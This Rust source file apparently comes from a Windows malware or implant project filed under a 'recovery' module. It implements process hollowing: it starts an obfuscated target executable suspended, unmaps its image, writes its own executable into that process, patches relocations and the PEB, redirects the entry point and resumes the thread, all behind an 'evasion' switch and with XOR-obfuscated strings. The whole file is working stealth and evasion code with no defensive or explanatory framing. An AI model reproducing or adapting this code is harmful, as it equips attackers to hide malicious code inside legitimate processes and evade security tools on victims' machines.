#![allow(non_snake_case)]

use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
use crate::recovery::settings::RecoveryControl;
use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use tracing::{debug, error, info};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Diagnostics::Debug::{
    CONTEXT, CONTEXT_FLAGS, GetThreadContext, ReadProcessMemory, SetThreadContext,
    WriteProcessMemory,
};
use windows::Win32::System::LibraryLoader::GetModuleHandleW;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, VirtualAllocEx};
use windows::Win32::System::Threading::{
    CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW,
};
use windows::core::{PCSTR, PCWSTR, PWSTR};

#[allow(non_snake_case)]
#[repr(C)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,
    pub e_cblp: u16,
    pub e_cp: u16,
    pub e_crlc: u16,
    pub e_cparhdr: u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss: u16,
    pub e_sp: u16,
    pub e_csum: u16,
    pub e_ip: u16,
    pub e_cs: u16,
    pub e_lfarlc: u16,
    pub e_ovno: u16,
    pub e_res: [u16; 4],
    pub e_oemid: u16,
    pub e_oeminfo: u16,
    pub e_res2: [u16; 10],
    pub e_lfanew: i32,
}

#[repr(C)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: u16,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: u16,
}

#[repr(C)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}

#[repr(C)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: u16,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: u16,
    pub DllCharacteristics: u16,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
pub struct IMAGE_SECTION_HEADER {
    pub Name: [u8; 8],
    pub Misc: u32,
    pub VirtualAddress: u32,
    pub SizeOfRawData: u32,
    pub PointerToRawData: u32,
    pub PointerToRelocations: u32,
    pub PointerToLinenumbers: u32,
    pub NumberOfRelocations: u16,
    pub NumberOfLinenumbers: u16,
    pub Characteristics: u32,
}

#[repr(C)]
pub struct IMAGE_BASE_RELOCATION {
    pub VirtualAddress: u32,
    pub SizeOfBlock: u32,
}

const CONTEXT_AMD64: u32 = 0x100000;
const CONTEXT_AMD64_FULL: u32 = CONTEXT_AMD64 | 0x1 | 0x2 | 0x4;

const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;

pub async fn perform_hollowing() {
    if !RecoveryControl::global().evasion_enabled() {
        return;
    }

    let args: Vec<String> = env::args().collect();
    if args.contains(&"--hollowed".to_string()) {
        debug!("already running in hollowed process");
        return;
    }

    info!("attempting process hollowing for stealth");

    let target_str = deobf(&[
        0xFE, 0x87, 0xE1, 0xEA, 0xD4, 0xD3, 0xD9, 0xD2, 0xCA, 0xCE, 0xE1, 0xEE, 0xC4, 0xCE, 0xC9,
        0xD8, 0xD0, 0x8E, 0x8F, 0xE1, 0xEF, 0xC8, 0xD3, 0xC9, 0xD4, 0xD0, 0xD8, 0xFF, 0xCF, 0xD2,
        0xD6, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
    ]);
    let target = &target_str;

    match hollow_and_run(target) {
        Ok(_) => {
            info!(
                "successfully hollowed into {}, exiting original process",
                target
            );
            std::process::exit(0);
        }
        Err(e) => {
            error!("process hollowing failed: {}", e);
        }
    }
}

fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let current_exe_path = env::current_exe()?;
        let mut payload_bytes = std::fs::read(current_exe_path)?;

        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let target_w: Vec<u16> = OsStr::new(target_path)
            .encode_wide()
            .chain(Some(0))
            .collect();
        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\" --hollowed", target_path))
            .encode_wide()
            .chain(Some(0))
            .collect();

        // Create target process in suspended state
        CreateProcessW(
            PCWSTR(target_w.as_ptr()),
            PWSTR(command_line.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|e| format!("failed to create target process: {}", e))?;

        let _pi_guard = ProcessInformationGuard(pi);

        // Get thread context to find PEB
        let mut context: CONTEXT = std::mem::zeroed();
        #[cfg(target_arch = "x86_64")]
        let mut target_image_base: *mut std::ffi::c_void = null_mut();

        #[cfg(target_arch = "x86_64")]
        {
            context.ContextFlags = CONTEXT_FLAGS(CONTEXT_AMD64_FULL);
            GetThreadContext(pi.hThread, &mut context)
                .map_err(|e| format!("failed to get context: {}", e))?;

            let peb_base = context.Rdx;
            ReadProcessMemory(
                pi.hProcess,
                (peb_base + 0x10) as *const _,
                &mut target_image_base as *mut _ as *mut _,
                std::mem::size_of::<*mut std::ffi::c_void>(),
                None,
            )
            .map_err(|e| format!("failed to read PEB: {}", e))?;

            // Unmap original image
            let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
            let ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr()))?;
            let nt_unmap_name_str = deobf(&[
                0xF3, 0xC9, 0xE8, 0xD3, 0xD0, 0xDC, 0xCD, 0xEB, 0xD4, 0xD8, 0xCA, 0xF2, 0xDB, 0xEE,
                0xD8, 0xDE, 0xC9, 0xD4, 0xD2, 0xD3,
            ]);
            let nt_unmap_name = format!("{}\0", nt_unmap_name_str);
            if let Some(proc) = windows::Win32::System::LibraryLoader::GetProcAddress(
                ntdll,
                PCSTR(nt_unmap_name.as_ptr()),
            ) {
                let nt_unmap_view_of_section: unsafe extern "system" fn(
                    HANDLE,
                    *mut std::ffi::c_void,
                ) -> u32 = std::mem::transmute(proc);
                nt_unmap_view_of_section(pi.hProcess, target_image_base);
            }
        }

        // Parse PE headers of payload
        let dos_header = &*(payload_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != 0x5A4D {
            // "MZ"
            return Err("invalid DOS header".into());
        }

        let nt_headers = &*(payload_bytes.as_ptr().add(dos_header.e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64);
        if nt_headers.Signature != 0x4550 {
            // "PE\0\0"
            return Err("invalid NT headers".into());
        }

        // Allocate memory in target process
        let mut remote_image_base = VirtualAllocEx(
            pi.hProcess,
            Some(nt_headers.OptionalHeader.ImageBase as *const _),
            nt_headers.OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            windows::Win32::System::Memory::PAGE_READWRITE,
        );

        if remote_image_base.is_null() {
            remote_image_base = VirtualAllocEx(
                pi.hProcess,
                None,
                nt_headers.OptionalHeader.SizeOfImage as usize,
                MEM_COMMIT | MEM_RESERVE,
                windows::Win32::System::Memory::PAGE_READWRITE,
            );
        }

        if remote_image_base.is_null() {
            return Err("failed to allocate memory in target process".into());
        }

        // Perform relocations if base changed
        let delta = remote_image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
        if delta != 0 {
            let reloc_dir =
                &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if reloc_dir.Size > 0 {
                let mut current_reloc_offset =
                    rva_to_offset(reloc_dir.VirtualAddress, nt_headers, payload_bytes.as_ptr())?;
                let max_reloc_offset = current_reloc_offset + reloc_dir.Size as usize;

                while current_reloc_offset < max_reloc_offset {
                    let reloc_block = &*(payload_bytes.as_ptr().add(current_reloc_offset)
                        as *const IMAGE_BASE_RELOCATION);
                    if reloc_block.SizeOfBlock == 0 {
                        break;
                    }

                    let entries_count = (reloc_block.SizeOfBlock as usize
                        - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                        / 2;
                    let entries_ptr = payload_bytes
                        .as_ptr()
                        .add(current_reloc_offset + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                        as *const u16;

                    for i in 0..entries_count {
                        let entry = *entries_ptr.add(i);
                        let reloc_type = entry >> 12;
                        let reloc_offset = entry & 0xFFF;

                        if reloc_type == IMAGE_REL_BASED_DIR64 {
                            let target_rva = reloc_block.VirtualAddress + reloc_offset as u32;
                            let target_file_offset =
                                rva_to_offset(target_rva, nt_headers, payload_bytes.as_ptr())?;

                            let val_ptr =
                                payload_bytes.as_mut_ptr().add(target_file_offset) as *mut i64;
                            *val_ptr += delta as i64;
                        }
                    }
                    current_reloc_offset += reloc_block.SizeOfBlock as usize;
                }
            }
        }

        // Write headers
        WriteProcessMemory(
            pi.hProcess,
            remote_image_base,
            payload_bytes.as_ptr() as *const _,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
            None,
        )
        .map_err(|e| format!("failed to write headers: {}", e))?;

        // Write sections
        let section_header_ptr = (payload_bytes
            .as_ptr()
            .add(dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()))
            as *const IMAGE_SECTION_HEADER;
        for i in 0..nt_headers.FileHeader.NumberOfSections {
            let section = &*section_header_ptr.add(i as usize);
            if section.SizeOfRawData > 0 {
                let remote_section_dest = (remote_image_base as usize
                    + section.VirtualAddress as usize)
                    as *mut std::ffi::c_void;
                let local_section_src = payload_bytes
                    .as_ptr()
                    .add(section.PointerToRawData as usize)
                    as *const std::ffi::c_void;

                WriteProcessMemory(
                    pi.hProcess,
                    remote_section_dest,
                    local_section_src,
                    section.SizeOfRawData as usize,
                    None,
                )
                .map_err(|e| format!("failed to write section {}: {}", i, e))?;
            }
        }

        // Apply memory protections
        use windows::Win32::System::Memory::{
            PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READONLY, VirtualProtectEx,
        };

        let mut old_prot = PAGE_PROTECTION_FLAGS::default();
        // Protect headers
        let _ = VirtualProtectEx(
            pi.hProcess,
            remote_image_base,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
            PAGE_READONLY,
            &mut old_prot,
        );

        // Protect sections
        for i in 0..nt_headers.FileHeader.NumberOfSections {
            let section = &*section_header_ptr.add(i as usize);
            if section.SizeOfRawData > 0 {
                let remote_section_dest = (remote_image_base as usize
                    + section.VirtualAddress as usize)
                    as *mut std::ffi::c_void;
                let is_executable = (section.Characteristics & 0x20000000) != 0;
                let is_writable = (section.Characteristics & 0x80000000) != 0;

                let prot = if is_executable {
                    PAGE_EXECUTE_READ
                } else if is_writable {
                    windows::Win32::System::Memory::PAGE_READWRITE
                } else {
                    PAGE_READONLY
                };
                let _ = VirtualProtectEx(
                    pi.hProcess,
                    remote_section_dest,
                    section.SizeOfRawData as usize,
                    prot,
                    &mut old_prot,
                );
            }
        }

        // Update thread context
        #[cfg(target_arch = "x86_64")]
        {
            // Update image base in PEB
            let peb_base = context.Rdx;
            let image_base_offset = peb_base + 0x10;

            WriteProcessMemory(
                pi.hProcess,
                (image_base_offset) as *const _,
                &remote_image_base as *const _ as *const _,
                std::mem::size_of::<usize>(),
                None,
            )?;

            // Update entry point in context
            context.Rcx =
                remote_image_base as u64 + nt_headers.OptionalHeader.AddressOfEntryPoint as u64;

            SetThreadContext(pi.hThread, &context)
                .map_err(|e| format!("failed to set context: {}", e))?;
        }

        ResumeThread(pi.hThread);

        Ok(())
    }
}

fn rva_to_offset(
    rva: u32,
    nt_headers: &IMAGE_NT_HEADERS64,
    base_ptr: *const u8,
) -> Result<usize, Box<dyn std::error::Error>> {
    unsafe {
        let section_header_ptr = (base_ptr.add(
            (*(base_ptr.add(0x3C) as *const i32)) as usize
                + std::mem::size_of::<IMAGE_NT_HEADERS64>(),
        )) as *const IMAGE_SECTION_HEADER;
        for i in 0..nt_headers.FileHeader.NumberOfSections {
            let section = &*section_header_ptr.add(i as usize);
            if rva >= section.VirtualAddress && rva < section.VirtualAddress + section.Misc {
                return Ok((rva - section.VirtualAddress + section.PointerToRawData) as usize);
            }
        }
    }
    Err("failed to map RVA to file offset".into())
}

struct ProcessInformationGuard(PROCESS_INFORMATION);

impl Drop for ProcessInformationGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.hProcess.is_invalid() {
                let _ = windows::Win32::Foundation::CloseHandle(self.0.hProcess);
            }
            if !self.0.hThread.is_invalid() {
                let _ = windows::Win32::Foundation::CloseHandle(self.0.hThread);
            }
        }
    }
}
